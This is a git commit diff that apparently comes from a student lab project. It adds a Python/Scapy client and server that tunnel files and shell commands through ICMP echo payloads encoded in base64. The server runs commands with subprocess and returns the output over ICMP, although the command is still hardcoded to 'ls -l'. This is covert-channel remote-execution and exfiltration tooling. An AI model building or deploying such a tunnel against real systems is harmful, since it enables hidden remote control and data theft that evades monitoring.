53a20aa7ea8b25d781119917cb5be917d80ac13c
Mathis <mcapisano1@myges.fr>
2024-05-03 09:54:34 +0200

    Begin to implement command sending

--- src/mathisClient.py
+++ src/mathisClient.py
@@ -1,23 +1,40 @@
-from scapy.all import sr1,IP,ICMP
+from scapy.all import *
 import base64
+
+destination = "192.168.18.1"
+sniffInterface = "eth0"
 
 
 while True:
 
-	action = input("-----------------------\nWhat should we do (with a lazy sailor) ? \nActions are : file | message | command\n")
+    action = input("-----------------------\nWhat should we do (with a lazy sailor) ? \nActions are : file | message | command\n")
 	
-	if action == "file":
+    if action == "file":
 		
+        fileName = input("Which file should we send ?\n")
+        fileToSend = open(fileName,"rb")
+        binaryData = fileToSend.read()
+        encoded = (base64.b64encode(binaryData)).decode('ascii')
+
+
+        # Protocole : type d'envoi (file/message)
+        p = sr1(IP(dst=destination)/ICMP()/"file")
+        p = sr1(IP(dst=destination)/ICMP()/fileName)
+        p = sr1(IP(dst=destination)/ICMP()/encoded)
+
+    elif action == "command":
+
+        command = input("What command should we run ?\n")
+        encodedCommand = base64.b64encode(command.encode('utf-8'))
+
+        # Protocole : type d'envoi (file/message)
+        p = sr1(IP(dst=destination)/ICMP()/"command")
+        p = sr1(IP(dst=destination)/ICMP()/encodedCommand)
+
+        icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=1)
+        base64Output = icmpReceived[0][3].fields.get("load").decode("utf-8")
+        print(base64.b64decode(base64Output))
 	
-		fileName = input("Which file should we send ?\n")
 
-		fileToSend = open(fileName,"rb")
-		binaryData = fileToSend.read()
-		encoded = (base64.b64encode(binaryData)).decode('ascii')
-
-
-		# Protocole : type d'envoi (file/message)
-		p = sr1(IP(dst="192.168.18.1")/ICMP()/"file")
-		p = sr1(IP(dst="192.168.18.1")/ICMP()/fileName)
-		p = sr1(IP(dst="192.168.18.1")/ICMP()/encoded)
-
+    elif action == "message":
+        print("Not implemented yet")
--- src/mathisServer.py
+++ src/mathisServer.py
@@ -1,8 +1,9 @@
 from scapy.all import *
 import base64
+import subprocess
 
 sniffInterface = "VMware Network Adapter VMnet8"
-
+destination = "192.168.18.129"
 
 while True:
     a = sniff(iface=sniffInterface, filter="icmp", count=1)
@@ -22,3 +23,28 @@ while True:
         print("base64File : "+base64File.decode("utf-8"))
         with open(fileName, "wb") as fh:
             fh.write(base64.decodebytes(base64File))
+
+    elif receivedMessage == "command":
+        icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=1)
+        base64Command = icmpReceived[0][3].fields.get("load").decode("utf-8")    
+
+        result = subprocess.run(
+            ['ls', '-l'],
+            shell = True,
+            capture_output = True, # Python >= 3.7 only
+            text = True # Python >= 3.7 only
+        )
+        output = "stdout:\n"+result.stdout+"\n\nstderr:\n"+result.stderr
+        print("command output: "+output)
+
+        encodedOutput = base64.b64encode(output.encode('utf-8'))
+        p = sr1(IP(dst=destination)/ICMP()/encodedOutput)
+
+        print("Finished sending command output")
+
+
+
+
+
+
+
